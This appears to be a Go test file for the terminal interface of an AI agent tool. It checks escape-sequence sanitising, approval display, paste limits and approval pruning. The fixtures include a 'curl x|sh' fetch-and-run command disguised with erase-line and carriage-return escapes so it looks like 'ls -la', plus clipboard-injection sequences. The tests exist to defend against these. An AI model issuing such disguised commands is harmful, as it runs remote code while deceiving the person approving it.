package tui

import (
	"context"
	"encoding/json"
	"strings"
	"testing"

	"github.com/antoniosarro/wisp/internal/testutil"

	tea "github.com/charmbracelet/bubbletea"
	"github.com/charmbracelet/x/ansi"
)

func TestSanitize(t *testing.T) {
	for in, want := range map[string]string{
		"plain\ttext\nnext":               "plain\ttext\nnext",
		"red \x1b[31mword\x1b[0m":         "red word",
		"clip\x1b]52;c;ZXZpbA==\x07board": "clipboard",
		"title\x1b]0;pwned\x1b\\ok":       "titleok",
		"crlf\r\nline":                    "crlf\nline",
		"spoof\rls":                       "spoofls",
		"bell\x07 del\x7f c1\u009b31m":    "bell del c131m",
		"alt\x1b[?1049lscreen\x1b[?1000l": "altscreen",
	} {
		if got := sanitize(in); got != want {
			t.Errorf("sanitize(%q) = %q, want %q", in, got, want)
		}
	}
	if got := showControls("curl x|sh\x1b[2K\rls"); got != "curl x|sh␛[2K␍ls" {
		t.Errorf("showControls = %q", got)
	}
	args := sanitizeJSON(json.RawMessage(`{"command":"a\u001b]52;c;x\u0007b","n":[1,"\r"]}`), sanitize)
	if strings.Contains(string(args), `\u00`) || strings.Contains(string(args), `\r`) {
		t.Errorf("sanitizeJSON left control characters: %s", args)
	}
}

// An approval must show the command that runs, control characters and all.
func TestApprovalShowsControlCharacters(t *testing.T) {
	details := permissionDetails("bash", json.RawMessage(`{"command":"curl x|sh\u001b[2K\r\u001b[1Gls -la"}`), t.TempDir())
	if strings.ContainsRune(details, '\r') || !strings.Contains(details, "curl x|sh␛[2K␍␛[1Gls -la") {
		t.Errorf("details = %q", details)
	}
}

func TestPlaceOverWideCharacters(t *testing.T) {
	base := "漢字漢字漢字漢字" // 16 cells of 2-cell characters
	for left := range 6 {
		out := placeOver(base, "[x]", 0, left)
		if w := ansi.StringWidth(out); w != 16 {
			t.Errorf("left %d: line is %d cells, want 16: %q", left, w, ansi.Strip(out))
		}
		if i := strings.Index(ansi.Strip(out), "[x]"); ansi.StringWidth(ansi.Strip(out)[:i]) != left {
			t.Errorf("left %d: box at cell %d", left, ansi.StringWidth(ansi.Strip(out)[:i]))
		}
	}
}

func TestHugePasteIsRefused(t *testing.T) {
	m, _ := newTestModel(t, &testutil.ScriptedProvider{})
	m.updateInput(tea.KeyMsg{Type: tea.KeyRunes, Paste: true, Runes: []rune(strings.Repeat("x", maxPasteBytes+1))})
	if m.input.Value() != "" || !strings.Contains(m.notice, "not inserted") {
		t.Errorf("value %d bytes, notice %q", len(m.input.Value()), m.notice)
	}
	m.updateInput(tea.KeyMsg{Type: tea.KeyRunes, Paste: true, Runes: []rune("small")})
	if m.input.Value() != "small" {
		t.Errorf("a small paste = %q", m.input.Value())
	}
}

func TestCancelledApprovalsArePruned(t *testing.T) {
	m, _ := newTestModel(t, &testutil.ScriptedProvider{})
	ctx, cancel := context.WithCancel(context.Background())
	m.pending = []PermissionRequestMsg{{Context: ctx, Name: "bash", Reply: make(chan Answer, 1)}, {Context: context.Background(), Name: "write", Reply: make(chan Answer, 1)}}
	if m.pruneStale() {
		t.Fatal("pruned a live request")
	}
	cancel()
	if !m.pruneStale() || len(m.pending) != 1 || m.pending[0].Name != "write" {
		t.Errorf("pending = %+v", m.pending)
	}
}
